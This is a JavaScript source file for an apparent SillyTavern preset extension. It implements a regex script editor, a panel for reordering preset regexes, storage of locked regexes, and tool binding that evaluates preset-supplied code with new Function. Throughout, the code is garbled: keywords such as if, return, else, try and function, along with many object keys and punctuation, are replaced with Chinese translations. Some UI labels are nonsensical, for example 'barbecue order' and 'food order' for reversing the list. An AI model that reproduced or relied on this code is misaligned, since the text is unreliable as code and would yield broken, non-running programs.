        existingScript.placement.forEach(element => {
          editorHtml.find(`input[name="replace_position"][value="${element}"]`).prop('checked', true);
        });
      }
    } 别的 {
      editorHtml.find('input[name="only_format_display"]').prop('checked', true);

      editorHtml.find('input[name="run_on_edit"]').prop('checked', true);

      editorHtml.find('input[name="replace_position"][value="1"]').prop('checked', true);
    }

    editorHtml.find('#regex_test_mode_toggle').on('click', function () {
      editorHtml.find('#regex_test_mode').toggleClass('displayNone');
      更新测试结果();
    });

    function updateTestResult() {
      updateInfoBlock(editorHtml);

      如果 (!editorHtml.find('#regex_test_mode').is(':visible')) {
        返回;
      }

      const testScript = {
        id: ctx.uuidv4(),
        scriptName: editorHtml.find('.regex_script_name').val().toString(),
        findRegex: editorHtml.find('.find_regex').val().toString(),
        替换字符串：editorHtml.find('.regex_replace_string').val().toString()，
        trimStrings：
          String(editorHtml.find('.regex_trim_strings').val())
            .split('\n')
            .filter(e => e.length !== 0) || [],
        substituteRegex: Number(editorHtml.find('select[name="substitute_regex"]').val()),
        已禁用：false，
        promptOnly: false,
        markdownOnly: false,
        runOnEdit: false,
        最小深度：null，
        最大深度：null，
        位置：null，
      };
      const rawTestString = String(editorHtml.find('#regex_test_input').val());
      const result = runRegexScript(testScript, rawTestString);
      editorHtml.find('#regex_test_output').text(result);
    }

    editorHtml.find('input, textarea, select').on('input', updateTestResult);
    updateInfoBlock(editorHtml);

    const popupResult = await ctx.callGenericPopup(editorHtml.get(0), ctx.POPUP_TYPE.CONFIRM, '', {
      okButton: ctx.t`保存`,
      取消按钮：ctx.t`取消`，
      allowVerticalScrolling: true,
    });
    如果 (popupResult) {
      const newRegexScript = {
        id: existingId ? String(existingId) : ctx.uuidv4(),
        scriptName: String(editorHtml.find('.regex_script_name').val()),
        findRegex: String(editorHtml.find('.find_regex').val()),
        replaceString: String(editorHtml.find('.regex_replace_string').val()),
        trimStrings：
          String(editorHtml.find('.regex_trim_strings').val())
            .split('\n')
            .filter(e => e.length !== 0) || [],
        放置：
          editorHtml
            .find('input[name="replace_position"]')
            .filter(':checked')
            .map(function () {
              return parseInt($(this).val().toString());
            })
            。得到（）
            .filter(e => !isNaN(e)) || [],
        已禁用: editorHtml.find('input[name="disabled"]').prop('checked'),
        markdownOnly: editorHtml.find('input[name="only_format_display"]').prop('checked'),
        promptOnly: editorHtml.find('input[name="only_format_prompt"]').prop('checked'),
        runOnEdit: editorHtml.find('input[name="run_on_edit"]').prop('checked'),
        substituteRegex: Number(editorHtml.find('select[name="substitute_regex"]').val()),
        minDepth: parseInt(String(editorHtml.find('input[name="min_depth"]').val())),
        maxDepth: parseInt(String(editorHtml.find('input[name="max_depth"]').val())),
      };

      保存正则表达式脚本(newRegexScript, existingScriptIndex);
      如果 (ctx.getCurrentChatId()) {
        ctx.reloadCurrentChat();
      }
    }
  }

  异步函数 popupSortPanel() {
    const popupHtml = $(`
      <div id="preset_regex_sort_panel">
        <div class="regex_editor">
          <h3 class="flex-container justifyCenter alignItemsBaseline">
            <strong data-i18n="预设则排序">预设则排序</strong>
            <div class="menu_button menu_button_icon" id="sort_help_button">
              <i class="fa-solid fa-circle-info fa-sm"></i>
              <span class="menu_button_text">使用说明</span>
            </div>
          </h3>

          <small class="flex-container extensions_info">
            通过上移/下移按钮调整预设正则的执行顺序。排序越靠前的正则执行优先级学习。
          </small>
          <hr />

          <div class="flex-container flexFlowColumn" style="max-height: 400px; overflow-y: auto;">
            <div id="sort_regex_list" class="flex-container flexFlowColumn">
              <!-- 动态生成的正则列表 -->
            </div>
          </div>

          <hr />
          
          <div class="flex-container justifySpaceEvenly flexWrap" style="gap: 5px;">
            <div class="menu_button menu_button_icon" id="sort_select_all">
              <i class="fa-solid fa-check-double"></i>
              <span class="menu_button_text">全选</span>
            </div>
            <div class="menu_button menu_button_icon" id="sort_batch_up">
              <i class="fa-solid fa-chevron-up"></i>
              <span class="menu_button_text">批量上移</span>
            </div>
            <div class="menu_button menu_button_icon" id="sort_batch_down">
              <i class="fa-solid fa-chevron-down"></i>
              <span class="menu_button_text">批量下移</span>
            </div>
            <div class="menu_button menu_button_icon" id="sort_reverse_order">
              <i class="fa-solid fa-arrow-rotate-left"></i>
              <span class="menu_button_text">烧烤顺序</span>
            </div>
            <div class="menu_button menu_button_icon" id="sort_reset_order">
              <i class="fa-solid fa-undo"></i>
              <span class="menu_button_text">重置顺序</span>
            </div>
          </div>
        </div>
      </div>
    `);

    // 渲染正则列表
    function renderSortList() {
      const listContainer = popupHtml.find('#sort_regex_list');
      listContainer.empty();

      如果 (presetRegexes.length === 0) {
        listContainer.append(`
          <div class="flex-container justifyCenter padding10">
            <small style="color: #888;">暂无预设规则</small>
          </div>
        `);
        返回;
      }

      presetRegexes.forEach((regex, index) => {
        const isLocked = lockedRegexes.findIndex(s => s.id === regex.id) !== -1;
        const itemHtml = $(`
          <div class="sort-item flex-container alignItemsCenter padding5" data-index="${index}" style="border: 1px solid #333; margin: 2px 0; border-radius: 4px; background: rgba(42, 42, 42, 0.3);">
            <div class="flex1 flex-container alignItemsCenter">
              <input type="checkbox" class="sort-checkbox" style="margin-right: 8px;" />
              <div class="sort-handle" style="margin-right: 8px; cursor: grab; color: #666;">
                <i class="fa-solid fa-grip-vertical"></i>
              </div>
              <div class="flex1" style="min-width: 0;">
                <div class="sort-name" style="font-weight: bold; color: ${
                  regex.disabled ? '#888' : '#fff'
                }; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">
                  ${已锁定？ '[锁定] ' : ''}${regex.scriptName || '未命名'}
                </div>
                <div class="sort-status" style="font-size: 12px; color: #888;">
                  ${正则表达式.禁用？ '已取消' : '已启用'} | 优先级：${index + 1}
                </div>
              </div>
            </div>
            <div class="flex-container flexNoGap">
              <div class="menu_button menu_button_icon sort-up ${
                index === 0 ? '已禁用' : ''
              }" data-index="${index}" title="上移">
                <i class="fa-solid fa-chevron-up"></i>
              </div>
              <div class="menu_button menu_button_icon sort-down ${
                index === presetRegexes.length - 1 ? 'disabled' : ''
              }" data-index="${index}" title="下移">
                <i class="fa-solid fa-chevron-down"></i>
              </div>
            </div>
          </div>
        `);
        listContainer.append(itemHtml);
      });

      // 更新按钮状态
      updateButtonStates();
    }

    // 更新按钮状态
    function updateButtonStates() {
      popupHtml.find('.sort-up').each(function (index) {
        $(this).toggleClass('disabled', index === 0);
      });
      popupHtml.find('.sort-down').each(function (index) {
        $(this).toggleClass('disabled', index === presetRegexes.length - 1);
      });
    }

    // 上移操作
    function moveUp(index) {
      如果（索引 > 0）{
        const temp = presetRegexes[index];
        presetRegexes[index] = presetRegexes[index - 1];
        presetRegexes[index - 1] = temp;
        renderSortList();
      }
    }

    // 下移操作
    function moveDown(index) {
      如果 (index < presetRegexes.length - 1) {
        const temp = presetRegexes[index];
        presetRegexes[index] = presetRegexes[index + 1];
        presetRegexes[index + 1] = temp;
        renderSortList();
      }
    }

    // 批量上移选中项
    function moveSelectedUp() {
      const selectedItems = [];
      popupHtml.find('.sort-checkbox:checked').each(function () {
        const index = parseInt($(this).closest('.sort-item').data('index'));
        selectedItems.push({ index, regex: presetRegexes[index] });
      });

      如果 (selectedItems.length === 0) {
        toastr.warning('请先选择要移动的项目');
        返回;
      }

      selectedItems.sort((a, b) => a.index - b.index); // 到我国大排序

      // 检查最前面的项目是否已经在顶部
      如果 (selectedItems[0].index === 0) {
        toastr.info('选中的项目已经在最顶部');
        返回;
      }

      // 从前往后移动，避免索引混乱
      let moved = false;
      for (let i = 0; i < selectedItems.length; i++) {
        const currentIndex = selectedItems[i].index - i; // 考虑前面已经移动的偏移
        如果 (currentIndex > 0) {
          const temp = presetRegexes[currentIndex];
          presetRegexes[currentIndex] = presetRegexes[currentIndex - 1];
          presetRegexes[currentIndex - 1] = temp;
          已移动 = true；
        }
      }

      如果（已移动）{
        renderSortList();
        // 重新选中移动后的项目
        setTimeout(() => {
          selectedItems.forEach(item => {
            const newIndex = Math.max(0, item.index - 1);
            popupHtml.find(`.sort-item[data-index="${newIndex}"] .sort-checkbox`).prop('checked', true);
          });
        }, 50);
      }
    }

    // 批量下移选中项
    function moveSelectedDown() {
      const selectedItems = [];
      popupHtml.find('.sort-checkbox:checked').each(function () {
        const index = parseInt($(this).closest('.sort-item').data('index'));
        selectedItems.push({ index, regex: presetRegexes[index] });
      });

      如果 (selectedItems.length === 0) {
        toastr.warning('请先选择要移动的项目');
        返回;
      }

      selectedItems.sort((a, b) => b.index - a.index); // 从大到小排序

      // 检查最后面的项目是否已经在底部
      如果 (selectedItems[0].index === presetRegexes.length - 1) {
        toastr.info('选中的项目已经在最底部');
        返回;
      }

      // 从后往前移动，避免索引混乱
      let moved = false;
      for (let i = 0; i < selectedItems.length; i++) {
        const currentIndex = selectedItems[i].index + i; // 考虑前面已经移动的偏移
        如果 (currentIndex < presetRegexes.length - 1) {
          const temp = presetRegexes[currentIndex];
          presetRegexes[currentIndex] = presetRegexes[currentIndex + 1];
          presetRegexes[currentIndex + 1] = temp;
          已移动 = true；
        }
      }

      如果（已移动）{
        renderSortList();
        // 重新选中移动后的项目
        setTimeout(() => {
          selectedItems.forEach(item => {
            const newIndex = Math.min(presetRegexes.length - 1, item.index + 1);
            popupHtml.find(`.sort-item[data-index="${newIndex}"] .sort-checkbox`).prop('checked', true);
          });
        }, 50);
      }
    }

    // 事件绑定
    popupHtml.on('click', '.sort-up:not(.disabled)', function (e) {
      e.停止传播();
      const index = parseInt($(this).data('index'));
      向上移动(index);
    });

    popupHtml.on('click', '.sort-down:not(.disabled)', function (e) {
      e.停止传播();
      const index = parseInt($(this).data('index'));
      向下移动(index);
    });

    // 全选/取消全选
    popupHtml.on('click', '#sort_select_all', function () {
      const checkboxes = popupHtml.find('.sort-checkbox');
      const allChecked = checkboxes.length === checkboxes.filter(':checked').length;
      checkboxes.prop('checked', !allChecked);
      $(this).find('i').toggleClass('fa-check-double', !allChecked).toggleClass('fa-minus', allChecked);
      $(this)
        .find('.menu_button_text')
        .text(allChecked ? '全选' : '取消全选');
    });

    // 批量上移
    popupHtml.on('click', '#sort_batch_up', function () {
      moveSelectedUp();
    });

    // 批量下移
    popupHtml.on('click', '#sort_batch_down', function () {
      moveSelectedDown();
    });

    // 食品顺序
    popupHtml.on('click', '#sort_reverse_order', function () {
      presetRegexes.reverse();
      renderSortList();
    });

    // 重置顺序（按名称排序）
    popupHtml.on('click', '#sort_reset_order', function () {
      presetRegexes.sort((a, b) => {
        return (a.scriptName || '').localeCompare(b.scriptName || '');
      });
      renderSortList();
    });

    // 帮助说明
    popupHtml.on('click', '#sort_help_button', function () {
      ctx.callGenericPopup(
        `
        <div style="text-align: left;">
          <h4>排序功能说明</h4>
          <ul style="margin: 10px 0; padding-left: 20px;">
            <li><strong>单项操作：</strong>点击单个项目右侧的上移/下移按钮调整位置</li>
            <li><strong>批量选择：</strong>勾选多个项目的组件，然后使用“批量上移”或“批量下移”按钮</li>
            <li><strong>全选：</strong>一键选择或取消选择所有项目</li>
            <li><strong>工件顺序：</strong>将当前列表完全翻转</li>
            <li><strong>重置顺序：</strong>按照按名称字母顺序重新排列</li>
          </ul>
          <h4>键盘快捷键</h4>
          <ul style="margin: 10px 0; padding-left: 20px;">
            <li><strong>Ctrl+A：</strong>全选/取消全选</li>
            <li><strong>Ctrl+↑：</strong>批量上移选中的项目</li>
            <li><strong>Ctrl+↓：</strong>批量下移选中项目</li>
          </ul>
          <p><strong>重要提示：</strong>排序越靠前的正则执行优先级增益，会先于后面的正则处理文本。合理安排正则顺序可以避免冲突并提高处理效果。</p>
        </div>
      `,
        ctx.POPUP_TYPE.TEXT，
      ）；
    });

    // 键盘快捷键
    popupHtml.on('keydown', function (e) {
      如果 (e.ctrlKey || e.metaKey) {
        switch (e.key) {
          情况'a'：
            e.preventDefault();
            popupHtml.find('#sort_select_all').click();
            休息;
          case 'ArrowUp':
            e.preventDefault();
            moveSelectedUp();
            休息;
          case 'ArrowDown':
            e.preventDefault();
            moveSelectedDown();
            休息;
        }
      }
    });

    // 初始渲染
    renderSortList();

    // 显示窗弹
    const popupResult = await ctx.callGenericPopup(popupHtml.get(0), ctx.POPUP_TYPE.CONFIRM, '', {
      okButton: '保存排序',
      cancelButton: '取消',
      allowVerticalScrolling: true,
    });

    如果 (popupResult) {
      // 保存新的排序
      saveRegexesToPreset(presetRegexes);
      await renderPresetRegexes();
      updateSTRegexes();
      toastr.success('预设则排序已保存');
    } 别的 {
      // 取消时恢复原始顺序
      const originalRegexes = getRegexesFromPreset();
      预设正则表达式长度 = 0;
      presetRegexes.push(...originalRegexes);
      toastr.info('已取消操作排序');
    }
  }

  function regexFromString(input) {
    尝试 {
      // 解析输入
      const m = input.match(/(\/?)(.+)\1([az]*)/i);

      // 无效标志
      如果 (m[3] && !/^(?!.*?(.).*?\1)[gmixXsuUAJ]+$/.test(m[3])) {
        返回正则表达式(输入)；
      }

      // 创建正则表达式
      返回新的正则表达式(m[2], m[3]);
    } 抓住 {
      返回;
    }
  }

  /**
   * 更新正则表达式编辑器中的信息块，提供有关查找正则表达式的提示。
   * @param {JQuery<HTMLElement>} editorHtml 编辑器 HTML
   */
  function updateInfoBlock(editorHtml) {
    const infoBlock = editorHtml.find('.info-block').get(0);
    const infoBlockFlagsHint = editorHtml.find('#regex_info_block_flags_hint');
    const findRegex = String(editorHtml.find('.find_regex').val());

    infoBlockFlagsHint.hide();

    // 如果查找正则表达式为空，则清除信息块
    如果 (!findRegex) {
      setInfoBlock(infoBlock, ctx.t`查找正则表达式为空`, 'info');
      返回;
    }

    尝试 {
      const regex = regexFromString(findRegex);
      如果 (!regex) {
        throw new Error(ctx.t`无效的查找正则表达式`);
      }

      const flagInfo = [];
      flagInfo.push(regex.flags.includes('g') ? ctx.t`适用于所有匹配项` : ctx.t`适用于第一个匹配项`);
      flagInfo.push(regex.flags.includes('i') ? ctx.t`不区分大小写` : ctx.t`区分大小写`);

      setInfoBlock(infoBlock, flagInfo.join('.'), 'hint');
      infoBlockFlagsHint.show();
    } catch (error) {
      setInfoBlock(infoBlock, error.message, 'error');
    }
  }
  /**
   * 更新信息块的内容和样式
   * @param {string | HTMLElement} target - 信息块的 CSS 选择器或 HTML 元素
   * @param {string | HTMLElement?} content - 要在信息块中显示的消息（支持 HTML）或 HTML 元素
   * @param {'hint' | 'info' | 'warning' | 'error'} [type='info'] - 消息类型，决定信息块的样式
   */
  function setInfoBlock(target, content, type = 'info') {
    如果 (!content) {
      clearInfoBlock(target);
      返回;
    }

    const infoBlock = typeof target === 'string' ? document.querySelector(target) : target;
    如果 (信息块) {
      infoBlock.className = `info-block ${type}`;
      如果 (typeof content === 'string') {
        infoBlock.innerHTML = 内容；
      } 别的 {
        infoBlock.innerHTML = '';
        infoBlock.appendChild(content);
      }
    }
  }

  /**
   * 清除信息块的内容和样式。
   * @param {string | HTMLElement} target - 信息块的 CSS 选择器或 HTML 元素
   */
  function clearInfoBlock(target) {
    const infoBlock = typeof target === 'string' ? document.querySelector(target) : target;
    如果 (infoBlock && infoBlock.classList.contains('info-block')) {
      infoBlock.className = '';
      infoBlock.innerHTML = '';
    }
  }
  异步函数 saveRegexScript(regexScript, existingScriptIndex) {
    const array = presetRegexes;
    如果 (!regexScript.id) {
      regexScript.id = ctx.uuidv4();
    }
    // 脚本名称是否未定义或为空？
    如果 (!regexScript.scriptName) {
      toastr.error(ctx.t`无法保存正则表达式脚本：脚本名称未定义或为空！`);
      返回;
    }

    // 是否存在查找正则表达式？
    如果 (regexScript.findRegex.length === 0) {
      toastr.warning(ctx.t`此正则表达式脚本将无法运行，但仍已保存：找不到查找正则表达式。`);
    }

    // 是否有地方可以放置结果？
    如果 (regexScript.placement.length === 0) {
      toastr.warning(
        ctx.t`此正则表达式脚本将无法运行，但仍然已保存：必须选中一个“影响”复选框！`
      ）；
    }

    如果 (existingScriptIndex !== -1) {
      array[existingScriptIndex] = regexScript;
    } 别的 {
      array.push(regexScript);
    }
    await renderPresetRegexes();
    saveRegexesToPreset(presetRegexes);
    updateSTRegexes();
    // ctx.reloadCurrentChat();
  }

  function loadLockedRegexes() {
    如果 （
      SGlobalSettings.RegexBinding &&
      SGlobalSettings.RegexBinding.lockedRegexes &&
      SGlobalSettings.RegexBinding.lockedRegexes.length > 0
    ) {
      返回 SGlobalSettings.RegexBinding.lockedRegexes;
    }
    如果 (!ctx.extensionSettings.regexBinding_scriptId) {
      返回 [];
    }
    如果 (typeof TavernHelper !== 'object') {
      返回 [];
    }
    const variables = TavernHelper.getVariables({
      类型：'脚本'
      script_id: ctx.extensionSettings.regexBinding_scriptId,
    });
    如果（变量 && 变量['锁定正则表达式']）{
      const json = JSON.stringify(variables['locked-regexes']);
      如果 (json) {
        const result = JSON.parse(json);
        // 如果不是数组，则返回 []
        如果 (!Array.isArray(result)) {
          toastr.error('加载锁定正则时出错，请尝试更新酒馆助手');
          返回 [];
        }
        返回结果；
      } 别的 {
        返回 [];
      }
    }
    返回 [];
  }

  函数 saveLockedRegexes(regexes) {
    如果 (!SGlobalSettings.RegexBinding) {
      SGlobalSettings.RegexBinding = {};
    }
    SGlobalSettings.RegexBinding.lockedRegexes = regexes;
    ctx.extensionSettings.SPreset = SGlobalSettings;
    ctx.saveSettingsDebounced();
  }

  function getRegexesFromPreset() {
    如果 (SPresetSettings.RegexBinding.regexes && SPresetSettings.RegexBinding.regexes.length > 0) {
      返回 SPresetSettings.RegexBinding.regexes；
    }
    const json = getPrompt('regexes-bindings') || '';
    返回 JSON 吗？JSON.parse(json) : [];
  }

  function saveRegexesToPreset(regexes) {
    const currentRegexes = getRegexesFromPreset();
    // 如果正则表达式已锁定且不在 currentRegexes 中，则不要保存它
    const newRegexes = regexes.filter(
      s => !lockedRegexes.find(l => l.id === s.id) || currentRegexes.find(c => c.id === s.id),
    ）；
    SPresetSettings.RegexBinding.regexes = newRegexes;
    如果 (!ctx.chatCompletionSettings.extensions) {
      ctx.chatCompletionSettings.extensions = {};
    }
    ctx.chatCompletionSettings.extensions.SPreset = SPresetSettings;
    如果 (getPrompt('SPresetSettings')) {
      setPrompt('SPresetSettings', JSON.stringify(SPresetSettings));
    } 别的 {
      addPrompt('SPresetSettings', 'SPreset 配置', JSON.stringify(SPresetSettings));
    }
    删除提示('正则表达式绑定');
    ctx.saveSettingsDebounced();
  }
};

const promptTemplate = {
  标识符：''，
  system_prompt: false,
  已启用：否
  标记：false，
  姓名： ''，
  角色：'系统'
  内容： ''，
  注射位置：0，
  注射深度：4，
  注射顺序：100，
  injection_trigger: null,
  forbid_overrides: false,
};

// ============================================================
// 工具绑定 —— SPreset Tool Binding (类似 SToolBook)
// ============================================================

const SPRESET_TOOL_REQUIRED_KEYS = ['name', 'description', 'parameters', 'action'];

/**
 * 验证工具代码 是否返回包含必要属性的对象
 * @param {string} 代码
 * @returns {{ valid: boolean, error?: string }}
 */
函数 validateSPresetToolCode(code) {
  如果 (!code || !code.trim()) {
    return { valid: false, error: '代码不能为空' };
  }
  尝试 {
    const fn = new Function(code);
    const result = fn();
    如果 (result === null || result === undefined || typeof result !== 'object') {
      return { valid: false, error: '代码必须返回一个对象' };
    }
    const missing = SPRESET_TOOL_REQUIRED_KEYS.filter(k => !(k in result));
    如果 (missing.length > 0) {
      return { valid: false, error: '缺少必需属性: ' +missing.join(', ') };
    }
    如果 (typeof result.name !== 'string' || !result.name.trim()) {
      return { valid: false, error: 'name 必须是非空字符串' };
    }
    如果 (typeof result.description !== 'string') {
      return { valid: false, error: 'description 必须是字符串' };
    }
    如果 (typeof result.parameters !== 'object') {
      return { valid: false, error: 'parameters 必须是对象' };
    }
    如果 (typeof result.action !== 'function') {
      return { valid: false, error: 'action 必须是函数' };
    }
    返回 { valid: true };
  } catch (e) {
    返回 { valid: false, error: e.message || String(e) };
  }
}

/**
 * 执行用户工具代码，返回工具定义对象
 * @param {string} 代码
 * @returns {object|null}
 */
函数 executeSPresetToolCode(code) {
  如果 (!code || !code.trim()) 返回 null；
  尝试 {
    const fn = new Function(code);
    const result = fn();
    如果 (!result || typeof result !== 'object') 返回 null;
    const missing = SPRESET_TOOL_REQUIRED_KEYS.filter(k => !(k in result));
    如果缺失值长度大于 0，则返回 null；
    返回结果；
  } catch (e) {
    console.warn('[SPreset-ToolBinding] 执行工具代码失败:', e);
    返回空值；
  }
}

/**
 * 获取当前prompt_order中已启用的标识符集合
 * @returns {Set<string>}
 */
function getActiveEntryIdentifiers() {
  const settings = ctx.chatCompletionSettings;
  const promptOrder = settings.prompt_order || [];
  const activeOrderEntry = promptOrder.find(po => po.character_id === 100001);
  如果 (!activeOrderEntry) 返回新的 Set();
  const enabled = new Set();
  for (const item of activeOrderEntry.order) {
    如果 (item.enabled !== false) {
      enabled.add(item.identifier);
    }
  }
  返回已启用；
}

/**
 * 注销所有已注册的SPreset工具
 */
function unregisterAllSPresetTools() {
  const { unregisterFunctionTool } = SillyTavern.getContext();
  for (spresetRegisteredTools 的 const [toolId]) {
    try { unregisterFunctionTool(toolId); } catch (e) { /* 忽略 */ }
  }
  spresetRegisteredTools.clear();
  console.log('[SPreset-ToolBinding]已注销所有工具');
}

/**
 * 根据ToolBindings + 激活项重新同步工具注册
 */
函数 syncSPresetToolRegistrations() {
  const { registerFunctionTool, unregisterFunctionTool } = SillyTavern.getContext();
  const toolBindings = SPresetSettings.ToolBindings || {};
  const activeIdentifiers = getActiveEntryIdentifiers();

  // 收集应注册的工具
  const shouldRegister = new Map();
  for (const [identifier, binding] of Object.entries(toolBindings)) {
    如果 (!binding.valid || !binding.enabled) 则继续；
    如果 (!activeIdentifiers.has(identifier)) 继续；

    const toolDef = executeSPresetToolCode(binding.code);
    如果 (!toolDef) 继续；

    const toolId = `${toolDef.name}`;
    shouldRegister.set(toolId, { toolDef, identifier, uuid: binding.uuid });
  }

  // 注销不再需要工具
  for (spresetRegisteredTools 的 const [toolId, uuid]) {
    if (!shouldRegister.has(toolId) || shouldRegister.get(toolId).uuid !== uuid) {
      try { unregisterFunctionTool(toolId); } catch (e) { /* 忽略 */ }
      spresetRegisteredTools.delete(toolId);
    }
  }

  // 注册新的/uuid 变化的工具
  for (const [toolId, { toolDef, identifier, uuid }] of shouldRegister) {
    if (spresetRegisteredTools.has(toolId) && spresetRegisteredTools.get(toolId) === uuid) {
      继续;
    }
    尝试 {
      if (spresetRegisteredTools.has(toolId)) {
        取消注册FunctionTool（工具ID）；
      }
      registerFunctionTool({
        名称：工具 ID，
        显示名称：toolDef.displayName || toolDef.name，
        描述：toolDef.description，
        参数：toolDef.parameters，
        操作：toolDef.action，
        formatMessage: toolDef.formatMessage,
        隐身：toolDef.stealth ?? false，
        shouldRegister: () => getActiveEntryIdentifiers().has(identifier),
      });
      spresetRegisteredTools.set(toolId, uuid);
      console.log(`[SPreset-ToolBinding] 已注册工具: ${toolId} (来自 ${identifier})`);
    } catch (e) {
      console.error(`[SPreset-ToolBinding] 注册工具 ${toolId} 失败:`, e);
    }
  }
}

function getPrompt(identifier) {
  const oai_settings = ctx.chatCompletionSettings;
  const prompts = oai_settings.prompts;
  const prompt = prompts.find(p => p.identifier === identifier)?.content;
  返回提示符 || null；
}

function setPrompt(identifier, content) {
  const oai_settings = ctx.chatCompletionSettings;
  const prompts = oai_settings.prompts;
  const prompt = prompts.find(p => p.identifier === identifier);
  如果（提示）{
    prompt.content = content;
  }
}

function addPrompt(id, name, content, extras = {}) {
  const prompt = { ...promptTemplate };
  prompt.identifier = id;
  prompt.name = name;
  prompt.content = content;
  prompt.role = extras.role || 'system';
  prompt.system_prompt = extras.system_prompt || false;
  prompt.enabled = extras.enabled || false;
  prompt.marker = extras.marker || false;
  prompt.injection_position = extras.injection_position || 0;
  prompt.injection_depth = extras.injection_depth || 4;
  prompt.injection_order = extras.injection_order || 100;
  prompt.injection_trigger = extras.injection_trigger;
  prompt.forbid_overrides = extras.forbid_overrides || false;
  const oai_settings = ctx.chatCompletionSettings;
  const prompts = oai_settings.prompts;
  prompts.push(提示)；
}
function deletePrompt(identifier) {
  const oai_settings = ctx.chatCompletionSettings;
  const prompts = oai_settings.prompts;
  const prompt = prompts.find(p => p.identifier === identifier);
  如果（提示）{
    prompts.splice(prompts.indexOf(prompt), 1);
  }
}
